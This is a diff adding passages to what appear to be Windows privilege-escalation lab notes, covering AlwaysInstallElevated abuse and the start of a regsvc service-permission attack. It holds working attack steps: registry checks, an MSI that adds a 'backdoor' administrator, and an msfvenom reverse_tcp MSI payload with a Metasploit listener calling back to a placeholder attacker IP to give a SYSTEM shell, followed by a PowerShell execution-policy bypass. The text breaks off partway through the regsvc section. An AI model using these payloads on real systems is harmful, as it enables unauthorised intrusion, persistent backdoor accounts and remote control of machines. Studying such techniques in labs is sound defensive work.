@@ -48,3 +48,73 @@ Now log out and sign in again in as high privileged user and now check the meter
 getuid 
 administrator
 ```
+
+## Always Install Elevated 
+
+The AlwaysInstallElevated setting is a Windows policy that affects how MSI (Microsoft Installer) packages are installed. When this policy is enabled, Windows Installer packages (.msi files) will always be installed with elevated (Administrator) privileges, even if the user who launches them does not have administrative rights. (AlwaysInstallElevated = 1 for this attack) 
+
+now login as low privileged user in the victim machine 
+
+**Victim**
+
+```
+// open cmd and type 
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+// here we can see for both AlwaysInstallElevated is set to 1 so attack is possible 
+
+// To understand the severity we can make a user add which run as high privilege and we can set the new user as administrator
+Write-UserAddMSI 
+
+// UserAdd.msi is generated running it we can set a new administrator called backdoor 
+net localgroup administrator
+backdoor
+Administrator 
+```
+
+**Attacker** 
+
+Generating the payload 
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=attacker_ip -f msi -o setup.msi
+```
+
+```
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost attacker_ip
+run 
+```
+
+Now transfer the payload setup.msi to the victim windows machine using python server and run the setup.msi in the victim machine. now we gained the reverse shell 
+
+```
+// we gain the reverse shell as system 
+getuid 
+server username: NT AUTHORITY\SYSTEM 
+
+// if we gained reverse shell as low level user then background the session of low level user 
+background 
+use exploit/windows/local/always_install_elevated 
+set session 1 
+run
+```
+
+## regsvc 
+
+It is a Windows service that allows remote users (with proper permissions) to connect to the Windows Registry and read/write keys over the network 
+
+**Victim** 
+
+```
+// open the powershell with bypassing the execution restrictions 
+powershell -ep bypass 
+
+// now see there is full control for regsvc for authority\system 
+Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+// so we found it contains full control so we going add a malicious service which add a administrator account for the attacker 
+```
